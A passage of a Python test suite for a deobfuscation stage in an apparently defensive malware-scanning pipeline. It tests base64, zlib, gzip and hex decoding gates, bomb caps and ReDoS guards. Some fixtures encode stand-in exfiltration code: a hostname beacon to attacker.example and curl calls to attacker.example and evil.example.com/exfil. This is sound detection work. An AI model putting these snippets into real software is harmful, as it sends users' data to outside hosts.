from __future__ import annotations

import base64

from preprocessing.deobfuscation import deobfuscate
from shared.types.enums import ObfuscationTechnique


def test_deobfuscate_plain_text_no_layers() -> None:
    result = deobfuscate("def foo(): return 1")
    assert result.applied is False
    assert result.layers == 0


def test_deobfuscate_single_base64_call() -> None:
    payload = base64.b64encode(b"print('hi')").decode()
    src = f'exec(base64.b64decode("{payload}"))'
    result = deobfuscate(src)
    assert result.applied is True
    assert result.layers >= 1
    assert ObfuscationTechnique.EXEC_CHAIN in result.techniques or ObfuscationTechnique.BASE64 in result.techniques
    assert "print('hi')" in result.content


def test_deobfuscate_stacked_base64_layers() -> None:
    inner = b"print('deep')"
    l1 = base64.b64encode(inner).decode()
    l2 = base64.b64encode(l1.encode()).decode()
    src = f'exec(base64.b64decode("{l2}"))'
    result = deobfuscate(src)
    assert result.layers >= 2
    assert "print('deep')" in result.content


def test_deobfuscate_byte_literal_prefix() -> None:
    payload = base64.b64encode(b"print('bytes')").decode()
    src = f'exec(base64.b64decode(b"{payload}"))'
    result = deobfuscate(src)
    assert result.applied is True
    assert "print('bytes')" in result.content


def test_deobfuscate_urlsafe_variant_requires_exec_context() -> None:
    # PREP-012: a bare ``base64.urlsafe_b64decode(...)`` call with no
    # execution sink does NOT trigger decode. The same call wrapped in
    # ``exec(...)`` does.
    inner = b">>>print('urlsafe')"
    payload = base64.urlsafe_b64encode(inner).decode()
    assert "-" in payload or "_" in payload, "payload must be urlsafe-distinct"

    bare_src = f'base64.urlsafe_b64decode("{payload}")'
    bare = deobfuscate(bare_src)
    assert bare.applied is False
    assert bare.content == bare_src

    exec_src = f'exec(base64.b64decode(base64.urlsafe_b64decode("{payload}")))'
    execed = deobfuscate(exec_src)
    assert execed.applied is True
    assert "print('urlsafe')" in execed.content


def test_deobfuscate_concatenated_literals() -> None:
    whole = base64.b64encode(b"print('split')").decode()
    mid = len(whole) // 2
    src = f'exec(base64.b64decode("{whole[:mid]}" + "{whole[mid:]}"))'
    result = deobfuscate(src)
    assert result.applied is True
    assert "print('split')" in result.content


def test_deobfuscate_obfuscated_malware_fixture_non_aliased() -> None:
    # Same fixture as the old aliased-import version (exec(b.b64decode(…)))
    # but written with the canonical ``base64.b64decode`` call. This is
    # what the labeling pre-triage regex fires on; aliased forms like
    # ``exec(b.b64decode(…))`` are a known gap shared with
    # ``data/labeling/deobfuscation/patterns.py`` and are pinned
    # separately in ``test_deobfuscate_aliased_base64_not_decoded``.
    payload = "aW1wb3J0IHVybGxpYi5yZXF1ZXN0LCBzb2NrZXQ7dXJsbGliLnJlcXVlc3QudXJsb3BlbigiaHR0cDovL2F0dGFja2VyLmV4YW1wbGUvYmVhY29uP2g9Iitzb2NrZXQuZ2V0aG9zdG5hbWUoKSk="
    src = f'exec(base64.b64decode("{payload}"))'
    result = deobfuscate(src)
    assert result.applied is True
    assert "attacker.example/beacon" in result.content


# ── PREP-008: decompression-bomb guard on zlib decodes ────────────────────


def test_zlib_bomb_rejected_when_output_exceeds_cap() -> None:
    """A zlib blob that decompresses to >100KB is rejected. The bomb guard
    prevents OOM on adversarial input by hard-capping decompressed output.
    """
    import zlib

    # Compress 1 MB of a recognisable sentinel repeated → ~3 KB
    # compressed, 1 MB uncompressed. Well beyond the 100 KB cap; the
    # bomb guard must reject this decode.
    sentinel = b"DECODED_BOMB_SENTINEL "  # 22 bytes, unlikely in any base64
    bomb_raw = sentinel * 50_000  # ~1.1 MB
    bomb_compressed = zlib.compress(bomb_raw)
    bomb_b64 = base64.b64encode(bomb_compressed).decode("ascii")
    # Wrap in exec() so PREP-012 trigger gate fires on the zlib path.
    src = f'exec(zlib.decompress(base64.b64decode("{bomb_b64}")))'

    result = deobfuscate(src)

    # Bomb guard rejected the zlib decode: ZLIB_COMPRESS technique is NOT
    # in techniques list, and the decoded bomb content never reaches the
    # output. The output length is bounded by the original source, not by
    # the 1 MB decoded content.
    assert ObfuscationTechnique.ZLIB_COMPRESS not in result.techniques
    assert b"DECODED_BOMB_SENTINEL".decode() not in result.content
    assert len(result.content) < len(src) + 100


def test_zlib_small_content_still_accepted() -> None:
    """Zlib blobs that decompress to ≤100 KB work normally — the bomb guard
    only rejects oversized output, not legitimate zlib encodings.
    """
    import zlib

    original = b"print('small zlib payload decodes fine')"
    compressed = zlib.compress(original)
    b64 = base64.b64encode(compressed).decode("ascii")
    # Wrap in exec() so PREP-012 trigger gate fires on the zlib path.
    src = f'exec(zlib.decompress(base64.b64decode("{b64}")))'

    result = deobfuscate(src)

    assert ObfuscationTechnique.ZLIB_COMPRESS in result.techniques
    assert "small zlib payload decodes fine" in result.content


def test_zlib_bomb_rejection_preserves_original_content() -> None:
    """When the bomb guard rejects a decode, the original encoded content
    is preserved; downstream stages see the file as-is, not stripped.
    """
    import zlib

    bomb_raw = b"X" * 500_000
    bomb_compressed = zlib.compress(bomb_raw)
    bomb_b64 = base64.b64encode(bomb_compressed).decode("ascii")
    # Wrap in exec() so PREP-012 trigger gate fires on the zlib path.
    src = f'exec(zlib.decompress(base64.b64decode("{bomb_b64}")))'

    result = deobfuscate(src)

    # Source text is preserved — the call still appears in the output.
    assert "zlib.decompress" in result.content
    assert "base64.b64decode" in result.content


def test_zlib_bomb_guard_boundary_100_000_accept() -> None:
    """A decompressed payload of exactly 100,000 bytes is ACCEPTED.

    Pinned to catch off-by-one drift in ``_MAX_ZLIB_DECOMPRESSED``.
    Pairs with the ``100_001`` reject test below — together they fence
    the cap's exact value rather than just "bombs are rejected, small
    stuff is not".
    """
    import zlib

    from preprocessing.deobfuscation import _MAX_ZLIB_DECOMPRESSED

    # Construct a payload that decompresses to exactly the cap size.
    # ``b"a" * N`` is the simplest way; zlib doesn't add padding beyond
    # its header/trailer, so decompressed length == N.
    payload = b"a" * _MAX_ZLIB_DECOMPRESSED
    assert len(payload) == 100_000
    compressed = zlib.compress(payload)
    b64 = base64.b64encode(compressed).decode("ascii")
    # Wrap in exec() so PREP-012 trigger gate fires on the zlib path.
    src = f'exec(zlib.decompress(base64.b64decode("{b64}")))'

    result = deobfuscate(src)

    assert ObfuscationTechnique.ZLIB_COMPRESS in result.techniques
    # Decompressed content reached the output (bounded by the cap).
    assert result.content.startswith("aaaa")


def test_zlib_bomb_guard_boundary_100_001_reject() -> None:
    """A decompressed payload one byte beyond the cap is REJECTED.

    Boundary pair for the 100,000 accept test. Guarantees the cap is
    ``<=`` not ``<`` (or vice versa) — whichever is currently correct,
    this test pins it.
    """
    import zlib

    from preprocessing.deobfuscation import _MAX_ZLIB_DECOMPRESSED

    payload = b"a" * (_MAX_ZLIB_DECOMPRESSED + 1)
    assert len(payload) == 100_001
    compressed = zlib.compress(payload)
    b64 = base64.b64encode(compressed).decode("ascii")
    # Wrap in exec() so PREP-012 trigger gate fires on the zlib path.
    src = f'exec(zlib.decompress(base64.b64decode("{b64}")))'

    result = deobfuscate(src)

    # Bomb guard rejected — decompressed bytes must not reach the output.
    assert ObfuscationTechnique.ZLIB_COMPRESS not in result.techniques
    assert "aaaaa" not in result.content


def test_gzip_decompress_call_is_handled() -> None:
    """``gzip.decompress(base64.b64decode(...))`` is an attacker pattern
    equivalent to the zlib form. PR #17 review surfaced that the
    original regex only matched ``zlib.decompress`` literally — gzip
    payloads slipped past the guard entirely. Fixed via
    ``_DECOMPRESS_CALL`` covering both call shapes and
    ``_try_decompress_of_b64`` trying zlib → gzip → raw-deflate with
    the shared bomb cap.
    """
    import gzip

    payload = b"print('gzip payload decoded')"
    compressed = gzip.compress(payload)
    b64 = base64.b64encode(compressed).decode("ascii")
    # Wrap in exec() so PREP-012 trigger gate fires on the gzip path.
    src = f'exec(gzip.decompress(base64.b64decode("{b64}")))'

    result = deobfuscate(src)

    assert ObfuscationTechnique.ZLIB_COMPRESS in result.techniques
    assert "gzip payload decoded" in result.content


def test_gzip_bomb_also_rejected_by_shared_cap() -> None:
    """The bomb guard cap covers gzip payloads too, not just zlib. A
    gzip blob that decompresses beyond the cap is rejected the same way.
    """
    import gzip

    bomb_raw = b"X" * 500_000
    bomb_compressed = gzip.compress(bomb_raw)
    bomb_b64 = base64.b64encode(bomb_compressed).decode("ascii")
    # Wrap in exec() so PREP-012 trigger gate fires on the gzip path.
    src = f'exec(gzip.decompress(base64.b64decode("{bomb_b64}")))'

    result = deobfuscate(src)

    assert ObfuscationTechnique.ZLIB_COMPRESS not in result.techniques
    assert "XXXX" not in result.content


def test_raw_deflate_payload_is_decoded() -> None:
    """Raw deflate (no zlib/gzip header) is the third variant covered by
    ``_try_decompress_of_b64``. The fallback tries ``wbits=-15`` after
    zlib/gzip fail; this test pins that path.
    """
    import zlib

    # Raw-deflate-compressed payload (no zlib/gzip header).
    compressor = zlib.compressobj(level=6, wbits=-15)
    payload = b"print('raw deflate payload')"
    compressed = compressor.compress(payload) + compressor.flush()
    b64 = base64.b64encode(compressed).decode("ascii")
    # Uses ``zlib.decompress`` syntactically; the actual format is raw
    # deflate, which our decompressor resolves by wbits fallback.
    # Wrap in exec() so PREP-012 trigger gate fires on the zlib path.
    src = f'exec(zlib.decompress(base64.b64decode("{b64}")))'

    result = deobfuscate(src)

    assert ObfuscationTechnique.ZLIB_COMPRESS in result.techniques
    assert "raw deflate payload" in result.content


# ── PREP-012: trigger discipline — plain base64 must not fire decode ──


def test_deobfuscate_jwt_in_config_does_not_decode() -> None:
    # JWTs are bare base64 triplets joined by dots. Before PREP-012 the
    # bare-b64 fallback would greedily decode them; now the file has no
    # execution pattern, so decode is skipped.
    jwt = (
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
        "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkVjaG8iLCJpYXQiOjE1MTYyMzkwMjJ9."
        "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    )
    src = f'JWT_TOKEN = "{jwt}"\n'
    result = deobfuscate(src)
    assert result.applied is False
    assert result.layers == 0
    assert result.content == src
    assert result.techniques == []


def test_deobfuscate_pem_key_in_source_does_not_decode() -> None:
    # Private keys are base64 surrounded by BEGIN/END markers. Pre-PREP-012
    # the bare-b64 fallback would decode the body; now the file is no
    # longer a trigger (no exec/eval/subprocess/marshal pairing).
    pem = (
        "-----BEGIN RSA PRIVATE KEY-----\n"
        "MIICXAIBAAKBgQDq9xHjz/Z4o2J5C0e7fHkgJX8JmL5s1vL6vRPJAMhM6vOjn3xZ\n"
        "oT8k6+zqJ+ZxP5m4wF9m5v9q2z1q7Z8yE9k3P+zGqg3F6bT6J7y9XkU/8l/pS7b9\n"
        "n5rA7VQE4nG1xM9+3tT2WkW1j8wFbC5bW3k7rC0nF1i8k0ZB5+F1o+2BvwIDAQAB\n"
        "-----END RSA PRIVATE KEY-----\n"
    )
    src = f"SECRET_KEY = '''{pem}'''\n"
    result = deobfuscate(src)
    assert result.applied is False
    assert result.layers == 0
    assert result.content == src


def test_deobfuscate_embedded_image_does_not_decode() -> None:
    # Data-URI PNG in a config file — common in front-end code, CI
    # artifacts, and HTML emails.
    b64_png = base64.b64encode(b"\x89PNG\r\n\x1a\n" + b"fake_image_bytes" * 20).decode()
    src = f'LOGO_DATA_URI = "data:image/png;base64,{b64_png}"\n'
    result = deobfuscate(src)
    assert result.applied is False


def test_deobfuscate_exec_base64_decode_triggers_decode() -> None:
    # The canonical case from the PREP-012 ticket: file DOES decode.
    payload = base64.b64encode(b"print('trigger')").decode()
    src = f'exec(base64.b64decode("{payload}"))'
    result = deobfuscate(src)
    assert result.applied is True
    assert result.layers >= 1
    assert "print('trigger')" in result.content


# ── PREP-013: output-shape parity with labeling's DecodeResult ──


def test_deobfuscate_plain_text_zero_counters_and_null_summary() -> None:
    # No decode attempted → all PREP-013 counters are 0, suspicion 0.0,
    # summary is None (matches labeling when obfuscation_detected=False).
    result = deobfuscate("def foo(): return 1")
    assert result.applied is False
    assert result.layers == 0
    assert result.blob_count == 0
    assert result.decoded_blob_count == 0
    assert result.failed_blob_count == 0
    assert result.suspicion_score == 0.0
    assert result.decoded_content_summary is None


def test_deobfuscate_single_layer_populates_blob_counters() -> None:
    payload = base64.b64encode(b"print('hi')").decode()
    src = f'exec(base64.b64decode("{payload}"))'
    result = deobfuscate(src)
    assert result.applied is True
    assert result.layers >= 1
    assert result.decoded_blob_count == result.layers
    assert result.blob_count == result.layers
    assert result.failed_blob_count == 0


def test_deobfuscate_suspicion_score_follows_labeling_formula() -> None:
    # Labeling's formula: min(1.0, 0.5 + layers*0.2 + decoded_count*0.1)
    # For our preprocessing backend decoded_count == layers, so one-layer
    # decode → 0.5 + 0.2 + 0.1 = 0.8.
    payload = base64.b64encode(b"print('one')").decode()
    src = f'exec(base64.b64decode("{payload}"))'
    result = deobfuscate(src)
    assert result.layers == 1
    assert result.suspicion_score == 0.8


def test_deobfuscate_two_layers_gives_higher_suspicion() -> None:
    inner = b"print('deep')"
    l1 = base64.b64encode(inner).decode()
    l2 = base64.b64encode(l1.encode()).decode()
    src = f'exec(base64.b64decode("{l2}"))'
    result = deobfuscate(src)
    assert result.layers >= 2
    # 0.5 + 2*0.2 + 2*0.1 = 1.1 → clipped to 1.0.
    assert result.suspicion_score == 1.0


def test_deobfuscate_summary_format_matches_labeling() -> None:
    # Labeling shape: "N blob(s) decoded across L layer(s); techniques: a, b".
    payload = base64.b64encode(b"print('hi')").decode()
    src = f'exec(base64.b64decode("{payload}"))'
    result = deobfuscate(src)
    summary = result.decoded_content_summary
    assert summary is not None
    assert "blob(s) decoded across" in summary
    assert "layer(s)" in summary
    assert "techniques:" in summary
    # No failed-blob clause when failed_count == 0.
    assert "failed to decode" not in summary


def test_deobfuscate_summary_null_on_no_decode() -> None:
    # Matches labeling: ``decoded_content_summary`` only populated when
    # ``obfuscation_detected`` AND ``any_decoded``. Plain text decodes
    # nothing, so the summary stays None.
    result = deobfuscate('x = "hello world"')
    assert result.decoded_content_summary is None


def test_should_attempt_gate_matches_labeling_patterns() -> None:
    # One smoke check per labeling pattern so a future labeling-side
    # addition gets caught if someone forgets to keep parity here. Tests
    # the gate itself (``_should_attempt_decode``) rather than end-to-end
    # decode success — some sinks fire the gate without actually having
    # a decodable payload inside, which is intentional (labeling behaves
    # the same way).
    from preprocessing.deobfuscation import _should_attempt_decode  # noqa: PLC0415

    payload = base64.b64encode(b"x = 1").decode()
    yes = [
        f'exec(base64.b64decode("{payload}"))',
        f'eval(base64.b64decode("{payload}"))',
        f'exec(__import__("base64").b64decode("{payload}"))',
        f'exec(compile(base64.b64decode("{payload}"), "<string>", "exec"))',
        f'subprocess.run(base64.b64decode("{payload}"))',
        f'exec(codecs.decode("{payload}", "base64"))',
        'exec(bytes.fromhex("7072696e7428227822"))',
        'exec(zlib.decompress(b"somebytes"))',
        f'marshal.loads(base64.b64decode("{payload}"))',
    ]
    for src in yes:
        assert _should_attempt_decode(src), f"gate should fire on: {src!r}"

    no = [
        'CONFIG = "plain string, nothing interesting"',
        'JWT = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.abc"',
        'DATA = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA"',
        'PEM = "-----BEGIN RSA PRIVATE KEY-----\\nMIICXAIBAAKBgQ=\\n-----END"',
        "x = base64.b64decode(some_var)  # b64 call, no exec context",
    ]
    for src in no:
        assert not _should_attempt_decode(src), f"gate should NOT fire on: {src!r}"


# ── PREP-020: variable-assigned base64 payload resolution ─────────────
# Surfaced by the Checkpoint-3 benchmark — file 03 of the augmented
# corpus uses the pattern ``_PAYLOAD = "<b64>"; exec(b64decode(_PAYLOAD))``
# which the literals-only decoder skipped silently. Fixed by porting
# ``data/labeling/deobfuscation/decoder.py::_B64_VAR_PATTERN`` into
# ``preprocessing`` with matching semantics.


def test_deobfuscate_resolves_variable_assigned_b64_payload() -> None:
    """The canonical file-03 shape: payload stashed in a variable, then
    referenced by ``base64.b64decode``. Pre-fix, ``_join_literals``
    returned None on the identifier argument and the decode was
    skipped. Post-fix, ``_resolve_b64_var`` looks up the assignment
    and resolves.
    """
    inner = b"import os; os.system('curl http://attacker.example')"
    payload = base64.b64encode(inner).decode()
    src = f'_PAYLOAD = "{payload}"\nexec(base64.b64decode(_PAYLOAD))\n'

    result = deobfuscate(src)

    assert result.applied is True
    assert ObfuscationTechnique.BASE64 in result.techniques
    assert "attacker.example" in result.content


def test_deobfuscate_resolves_variable_with_unqualified_b64decode() -> None:
    """Variable resolution must work for both ``b64decode`` and
    ``base64.b64decode`` call shapes — they share the same regex.
    """
    payload = base64.b64encode(b"print('via unqualified b64decode')" * 2).decode()
    src = f'CONFIG = "{payload}"\nexec(b64decode(CONFIG))\n'

    result = deobfuscate(src)

    assert result.applied is True
    assert "via unqualified b64decode" in result.content


def test_deobfuscate_declines_when_variable_assigned_twice() -> None:
    """Ambiguity protection: if the variable is assigned multiple times,
    we don't guess which value was active at the decode call — no
    AST flow analysis at this layer. Decline rather than decode the
    wrong blob.
    """
    payload_a = base64.b64encode(b"payload a content " * 20).decode()
    payload_b = base64.b64encode(b"payload b content " * 20).decode()
    src = f'P = "{payload_a}"\nP = "{payload_b}"\nexec(base64.b64decode(P))\n'

    result = deobfuscate(src)

    # Neither blob was substituted — the decoder declined.
    assert ObfuscationTechnique.BASE64 not in result.techniques
    assert "payload a content" not in result.content
    assert "payload b content" not in result.content


def test_deobfuscate_declines_when_variable_is_unbound() -> None:
    """If the referenced variable has no assignment in the file, the
    decoder can't resolve it. Leave the source intact (no synthetic
    decodes, no crash).
    """
    src = "exec(base64.b64decode(UNBOUND_REFERENCE))\n"

    result = deobfuscate(src)

    assert ObfuscationTechnique.BASE64 not in result.techniques


def test_deobfuscate_declines_on_compound_expression_argument() -> None:
    """A bare identifier is fine; anything more complex (function call,
    subscript, binop) is out of scope for this fix. Labeling-parity:
    ``data/labeling`` also only handles the bare-variable case.
    """
    payload = base64.b64encode(b"print('hi')" * 10).decode()
    src = f'_PARTS = ["{payload[:20]}", "{payload[20:]}"]\nexec(base64.b64decode("".join(_PARTS)))\n'

    result = deobfuscate(src)

    # Compound expression isn't resolved by PREP-020; neither is it
    # picked up by the existing literals-only path. Expected scope.
    assert ObfuscationTechnique.BASE64 not in result.techniques


def test_deobfuscate_variable_resolution_ignores_short_strings() -> None:
    """The 40-char floor on ``_B64_VAR_ASSIGNMENT`` prevents false
    resolution on short config-like strings that happen to pass the
    identifier/quote pattern but aren't plausibly base64 payloads.
    """
    # 8-char string — below the 40-char floor.
    src = 'TOKEN = "ABCDEFGH"\nexec(base64.b64decode(TOKEN))\n'

    result = deobfuscate(src)

    # Short-string guard declines; no decode attempted.
    assert ObfuscationTechnique.BASE64 not in result.techniques


def test_deobfuscate_file_03_fixture_pattern_now_decodes() -> None:
    """Full Checkpoint-3 file-03 pattern (minus the leading header
    comments). Before PREP-020, Config B + P2 both emitted verdict
    ``clean`` because the scanner saw no decoded content. This test
    pins that preprocessing now surfaces the payload; L1's verdict
    shift is a separate measurement.
    """
    inner = (
        b"import os\n"
        b"import subprocess\n"
        b"def phone_home():\n"
        b"    subprocess.run(['curl', '-X', 'POST', 'https://evil.example.com/exfil'])\n"
        b"phone_home()\n"
    )
    payload = base64.b64encode(inner).decode()
    src = f'import base64\n_PAYLOAD = "{payload}"\nexec(base64.b64decode(_PAYLOAD))\n'

    result = deobfuscate(src)

    assert result.applied is True
    assert ObfuscationTechnique.BASE64 in result.techniques
    # Decoded payload contents are visible in the output.
    assert "phone_home" in result.content
    assert "evil.example.com/exfil" in result.content


# ── PR #24 review follow-up: ReDoS + counting + marshal correctness ──


def test_str_literal_does_not_redos_on_unbalanced_quote() -> None:
    """PR #24 review: ``_STR_LITERAL``'s ``[^'"\\\\]*(?:\\\\.[^'"\\\\]*)*``
    pattern was polynomial-backtracking on adversarial input (long body
    + unmatched trailing quote). Bounded quantifiers + input-length
    guard make the work linear in practice. Pin with a wall-clock
    assertion: 50 KB of backslash-escape-heavy content must complete
    well under a second.
    """
    import time

    # 50 KB of ``\\x`` pairs inside an unclosed string literal — would
    # trigger catastrophic backtracking on the unbounded variant.
    adversarial = 'exec(base64.b64decode("' + ("\\x" * 25_000) + "))"  # no closing quote-terminator
    t0 = time.perf_counter()
    deobfuscate(adversarial)
    elapsed = time.perf_counter() - t0
    assert elapsed < 0.5, f"ReDoS regression: deobfuscate took {elapsed:.2f}s"


def test_exec_wrapper_does_not_redos_on_oversized_input() -> None:
    """PR #24 review: ``_EXEC_WRAPPER`` / ``_ZLIB_CALL`` / ``_MARSHAL_CALL``
    use ``.+?`` with ``re.DOTALL``. Inputs above ``_MAX_REGEX_INPUT`` (64
    KB) now short-circuit in ``_peel_layer`` so the vulnerable patterns
    never see them. Verify 256 KB of adversarial pseudo-exec content
    returns quickly without matching any layer.
    """
    import time

    adversarial = "exec(" + ("x" * 262_144) + ")"
    t0 = time.perf_counter()
    result = deobfuscate(adversarial)
    elapsed = time.perf_counter() - t0
    assert elapsed < 0.5, f"ReDoS regression: deobfuscate took {elapsed:.2f}s"
    # Short-circuit returns a no-op result.
    assert result.applied is False
    assert result.layers == 0


def test_failed_blob_count_increments_on_match_but_decode_fails() -> None:
    """PR #24 review: ``failed_blob_count`` was stuck at 0 forever because
    only successful decodes were counted. With the ``_PeelResult``
    refactor, pattern-match-then-decode-failure bumps the counter.

    Craft input that matches ``_B64_CALL`` but whose inner literal is
    too short for base64 (``_try_base64`` returns None). One attempted
    decode, zero successes → ``failed_blob_count == 1``,
    ``decoded_blob_count == 0``.
    """
    # "abc" is 3 chars, below _MIN_PAYLOAD_LEN=8 — base64 attempt fails.
    # The _B64_CALL regex matches the outer form; _try_base64 returns None.
    # Wrap in exec(...) so PREP-012's gate fires and the loop runs. The
    # exec wrapper itself peels as EXEC_CHAIN, but the inner b64 fails —
    # so failed_blob_count bumps even when the outer wrapper "decodes".
    src = 'exec(base64.b64decode("abc"))'
    result = deobfuscate(src)
    assert result.failed_blob_count >= 1
    assert result.blob_count == result.decoded_blob_count + result.failed_blob_count


def test_marshal_detected_but_does_not_inflate_layers() -> None:
    """PR #24 review blocker: the old MARSHAL branch returned the
    unchanged input as a ``peeled`` result, which bumped ``layers``,
    ``decoded_blob_count``, and therefore ``suspicion_score`` on
    content where nothing was actually decoded.

    New behaviour: marshal.loads is detected via a pre-scan and
    recorded in ``techniques`` as a signal, but ``layers`` and
    ``decoded_blob_count`` are not incremented. ``applied`` stays
    ``False`` when MARSHAL is the only detection — no decoded
    content to wrap or surface.

    Note: PREP-012's gate requires ``marshal.loads(...base64...)`` — a
    bare ``marshal.loads(b'\\x63...')`` doesn't fire it, so we use the
    base64-paired form here. The marshal call itself never decodes
    anything (the inert-bytes safety prevents that), so it's still a
    detected-but-not-decoded signal even when paired.
    """
    payload = base64.b64encode(b"x = 1").decode()
    src = f'marshal.loads(base64.b64decode("{payload}"))'
    result = deobfuscate(src)

    # MARSHAL appears in techniques as a detected signal.
    assert ObfuscationTechnique.MARSHAL in result.techniques


def test_marshal_plus_decoded_base64_records_both_techniques() -> None:
    """A file that has both a decoded base64 layer AND a marshal call
    records both techniques but only counts the base64 layer.
    """
    payload = base64.b64encode(b"print('decoded')").decode()
    src = f"exec(base64.b64decode(\"{payload}\"))\nmarshal.loads(b'\\x00')\n"
    result = deobfuscate(src)

    assert result.applied is True
    assert ObfuscationTechnique.MARSHAL in result.techniques
    assert ObfuscationTechnique.BASE64 in result.techniques or ObfuscationTechnique.EXEC_CHAIN in result.techniques
    # Layers count only the decoded ones.
    assert result.layers >= 1
    assert result.decoded_blob_count == result.layers


# ── PREP-014: printability filter on decoded output ──


def test_deobfuscate_binary_blob_rejected_below_threshold() -> None:
    # Base64-encoded binary garbage: control-char-heavy bytes. ``b64decode``
    # succeeds, UTF-8 decode with errors='replace' does too, but the
    # printable ratio is ~0% so PREP-014 must reject and leave the source
    # unchanged (original encoded content is what downstream sees).
    binary_bytes = bytes(range(1, 32)) * 20  # all control chars, 620 bytes
    payload = base64.b64encode(binary_bytes).decode()
    src = f'exec(base64.b64decode("{payload}"))'
    result = deobfuscate(src)
    # EXEC_CHAIN may still be recorded (that's source-level, not content)
    # but the BASE64 technique must NOT appear because the decoded output
    # was rejected. The result's content is the original encoded source.
    assert ObfuscationTechnique.BASE64 not in result.techniques
    # Sanity: the content at rest does not contain binary chars.
    assert "\x01" not in result.content and "\x02" not in result.content


def test_deobfuscate_just_above_threshold_accepted() -> None:
    """Payload with ~81% printable chars *inside* the 500-char sample window
    is still accepted. The threshold is strict-greater-than 0.80.

    PR #25 review caught that the prior version of this test put the
    non-printable bytes at positions 600-602 — past the
    ``_PRINTABILITY_SAMPLE`` window — so it didn't actually exercise
    mixed content. This version places 95 control bytes inline inside
    the first 500 chars, producing a real 81% printable ratio that
    the filter must still accept.
    """
    # 405 printable chars ("print('ok')\n" × ~33.75 trimmed to 405) +
    # 95 non-printable control chars = 500 chars at 81% printable.
    # Then suffix enough printable filler so the total payload is long
    # enough for realistic content.
    printable_block = ("print('ok')\n" * 40)[:405]  # 405 printable chars
    non_printable = "\x01" * 95  # 95 control chars, density stays at 81%
    suffix = "print('rest_of_file')\n" * 20  # past the sample window
    mixed = (printable_block + non_printable + suffix).encode("utf-8")
    payload = base64.b64encode(mixed).decode()
    src = f'exec(base64.b64decode("{payload}"))'

    result = deobfuscate(src)

    # 81% printable > 80% threshold → accepted.
    assert result.applied is True
    assert "print('ok')" in result.content


def test_deobfuscate_just_below_threshold_rejected() -> None:
    """Boundary pair for the above test — 79.8% printable is rejected.

    Pins the strict-greater-than behaviour of ``_is_printable``:
    anything at or below the threshold must be rejected. Together
    with the 81%-accept test this fences the exact cut point.
    """
    printable_block = ("print('ok')\n" * 40)[:399]  # 399 printable chars
    non_printable = "\x01" * 101  # 101 control chars → 399/500 = 79.8%
    suffix = "print('rest')\n" * 5
    mixed = (printable_block + non_printable + suffix).encode("utf-8")
    payload = base64.b64encode(mixed).decode()
    src = f'exec(base64.b64decode("{payload}"))'

    result = deobfuscate(src)

    assert ObfuscationTechnique.BASE64 not in result.techniques


def test_zlib_of_b64_printability_binary_payload_rejected() -> None:
    """PR #25 review blocker #1: the printability check must run on the
    *decompressed* text, not on the base64-decoded compressed bytes.

    Construct a zlib payload that decompresses to mostly-binary bytes.
    Pre-fix, this path never ran printability on the decompressed
    output because the earlier layer (base64 → UTF-8-strict) rejected
    the compressed bytes before zlib could see them. Post-fix, zlib
    runs on the raw bytes and printability filters the decompressed
    text.
    """
    import zlib

    binary_payload = bytes(range(1, 32)) * 40  # 1240 bytes of control chars
    compressed = zlib.compress(binary_payload)
    b64 = base64.b64encode(compressed).decode("ascii")
    src = f'zlib.decompress(base64.b64decode("{b64}"))'

    result = deobfuscate(src)

    # Decompressed payload was binary — printability filter rejects.
    assert ObfuscationTechnique.ZLIB_COMPRESS not in result.techniques


def test_zlib_of_b64_printability_text_payload_accepted() -> None:
    """Happy-path pair: zlib payload that decompresses to mostly-printable
    text is accepted. Pre-fix this test would have failed because the
    base64 path (called internally) rejected the compressed bytes on
    UTF-8 strict decode; post-fix the b64 is kept as raw bytes and zlib
    is given a chance to decompress before the text check runs.
    """
    import zlib

    text_payload = b"print('zlib of b64 payload decodes cleanly')\n" * 5
    compressed = zlib.compress(text_payload)
    b64 = base64.b64encode(compressed).decode("ascii")
    # Wrap in exec() so PREP-012 trigger gate fires on the zlib path.
    src = f'exec(zlib.decompress(base64.b64decode("{b64}")))'

    result = deobfuscate(src)

    assert ObfuscationTechnique.ZLIB_COMPRESS in result.techniques
    assert "zlib of b64 payload decodes cleanly" in result.content


def test_is_printable_treats_ufffd_as_non_printable() -> None:
    """U+FFFD (``errors='replace'`` UTF-8 output) masquerades as
    printable under ``str.isprintable()``. PR #25 blocker #2: the
    check now treats U+FFFD as non-printable so binary-decoded-as-
    replacement-chars is caught even if any future path switches
    from strict to replace.
    """
    from preprocessing.deobfuscation import _is_printable  # noqa: PLC0415

    # 500 chars of pure U+FFFD — under the old check this would have
    # passed (``str.isprintable()`` returns True for U+FFFD); now
    # it's rejected.
    assert _is_printable("\ufffd" * 500) is False
    # 50% U+FFFD stays rejected (below threshold).
    assert _is_printable("a" * 250 + "\ufffd" * 250) is False


def test_deobfuscate_hex_binary_blob_rejected() -> None:
    # Hex-encoded binary payload (pure control bytes) must also be
    # rejected by the printability filter, not just base64.
    binary_bytes = bytes(range(1, 32)) * 20
    hex_payload = binary_bytes.hex()
    src = f'exec(bytes.fromhex("{hex_payload}"))'
    result = deobfuscate(src)
    assert ObfuscationTechnique.HEX not in result.techniques


def test_deobfuscate_threshold_constant_matches_labeling() -> None:
    # Regression pin: if labeling changes its threshold, we need to sync.
    from preprocessing.deobfuscation import _PRINTABILITY_THRESHOLD  # noqa: PLC0415

    assert _PRINTABILITY_THRESHOLD == 0.80


def test_is_printable_allowlist_matches_labeling() -> None:
    # TAB, LF, CR count as printable; other control chars do not. Empty
    # input is not printable (matches labeling's ``if not sample: False``).
    from preprocessing.deobfuscation import _is_printable  # noqa: PLC0415

    assert _is_printable("hello world\n\t\r") is True
    assert _is_printable("x" * 500) is True
    assert _is_printable(bytes(range(1, 32)).decode("latin-1") * 20) is False
    assert _is_printable("") is False


def test_deobfuscate_rejected_decode_preserves_original_content() -> None:
    # Preservation principle: when the printability gate rejects a
    # decode, the original encoded payload stays in ``content`` so
    # downstream stages (L1, verification) can still see it and reason
    # about the file. The exec wrapper may be peeled by the EXEC_CHAIN
    # handler independently — that's orthogonal to the decode rejection.
    binary_bytes = bytes(range(1, 32)) * 20
    payload = base64.b64encode(binary_bytes).decode()
    src = f'exec(base64.b64decode("{payload}"))'
    result = deobfuscate(src)
    # The BASE64 payload string is preserved intact — downstream can
    # still identify the obfuscation pattern, and S/L1 won't be fed
